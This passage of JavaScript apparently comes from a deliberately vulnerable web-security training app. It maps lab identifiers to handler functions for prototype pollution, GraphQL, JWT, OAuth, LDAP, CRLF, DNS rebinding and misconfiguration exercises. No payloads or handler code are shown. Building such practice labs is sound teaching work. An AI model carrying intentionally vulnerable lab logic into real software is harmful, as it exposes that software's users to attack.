  'proto-1': (r, u, c) => protoLabs.proto(r, u, c),
  'proto-2': (r, u, c) => protoLabs.nested(r, u, c),
  'proto-3': (r, u, c) => protoLabs.gadget(r, u, c),
  'graphql-1': (r, u, c) => graphql.intro(r, u, c),
  'graphql-2': (r, u, c) => graphql.bola(r, u, c),
  'graphql-3': (r, u, c) => graphql.batch(r, u, c),
  'ws-1': (r, u, c) => ws.connect(r, u, c),
  'ws-2': (r, u, c) => ws.send(r, u, c),
  'ws-3': (r, u, c) => ws.authz(r, u, c),
  'ws-4': (r, u, c) => ws.owner(r, u, c),
  'redirect-1': (r, u, c) => redirectLabs.open(r, u, c),
  'redirect-2': (r, u, c) => redirectLabs.bypass(r, u, c),
  'jwt-1': (r, u, c) => jwtLabs.noneAlg(r, u, c),
  'jwt-2': (r, u, c) => jwtLabs.confusion(r, u, c),
  'jwt-3': (r, u, c) => jwtLabs.weakSecret(r, u, c),
  'oauth-1': (r, u, c) => oauthLabs.redirect(r, u, c),
  'oauth-2': (r, u, c) => oauthLabs.scope(r, u, c),
  'oauth-3': (r, u, c) => oauthLabs.email(r, u, c),
  'info-1': (r, u, c) => info.debug(r, u, c),
  'info-2': (r, u, c) => info.source(r, u, c),
  'ldap-1': (r, u, c) => ldap.auth(r, u, c),
  'ldap-2': (r, u, c) => ldap.blind(r, u, c),
  'xpath-1': (r, u, c) => xpath.boolean(r, u, c),
  'xpath-2': (r, u, c) => xpath.blind(r, u, c),
  'hpp-1': (r, u, c) => hpp.login(r, u, c),
  'hpp-2': (r, u, c) => hpp.admin(r, u, c),
  'ssi-1': (r, u, c) => ssi.basic(r, u, c),
  'ssi-2': (r, u, c) => ssi.encoded(r, u, c),
  'csp-1': (r, u, c) => csp.inline(r, u, c),
  'csp-2': (r, u, c) => csp.jsonp(r, u, c),
  'dom-1': (r, u, c) => dom.clobber(r, u, c),
  'dom-2': (r, u, c) => dom.postmsg(r, u, c),
  'sri-1': (r, u, c) => sriLabs.script(r, u, c),
  'crlf-1': (r, u, c) => crlf.header(r, u, c),
  'crlf-2': (r, u, c) => crlf.log(r, u, c),
  'wcd-1': (r, u, c) => wcd.path(r, u, c),
  'wcd-2': (r, u, c) => wcd.origurl(r, u, c),
  'verb-1': (r, u, c) => verb.admin(r, u, c),
  'verb-2': (r, u, c) => verb.changepw(r, u, c),
  'mass-1': (r, u, c) => mass.register(r, u, c),
  'mass-2': (r, u, c) => mass.update(r, u, c),
  'expose-1': (r, u, c) => expose.api(r, u, c),
  'expose-2': (r, u, c) => expose.autocomplete(r, u, c),
  'formula-1': (r, u, c) => formula.csv(r, u, c),
  'redos-1': (r, u, c) => redos.search(r, u, c),
  'redos-2': (r, u, c) => redos.email(r, u, c),
  'rebind-1': (r, u, c) => rebind.ssrf(r, u, c),
  'ctc-1': (r, u, c) => ctc.polyglot(r, u, c),
  'misconfig-1': (r, u, c) => misconfig.defaultCreds(r, u, c),
  'misconfig-2': (r, u, c) => misconfig.dirlist(r, u, c),
  'misconfig-3': (r, u, c) => misconfig.verbose(r, u, c)
};
